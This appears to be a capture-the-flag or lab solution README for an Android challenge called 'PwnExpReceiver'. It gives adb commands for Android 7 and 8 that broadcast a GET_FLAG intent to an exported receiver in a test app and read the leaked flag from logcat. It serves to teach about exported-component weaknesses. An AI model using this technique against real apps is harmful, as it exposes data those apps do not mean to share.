# PwnExpReceiver



## Android7

```sh
adb shell am broadcast -a com.avss.testreceiver.GET_FLAG com.avss.testreceiver
adb logcat -d
```



## Android8

需要用`-n`指定组件名称。

```sh
adb shell am broadcast -a com.avss.testreceiver.GET_FLAG -n "com.avss.testreceiver/.MyBroadcastReceiver"
adb logcat -d
```

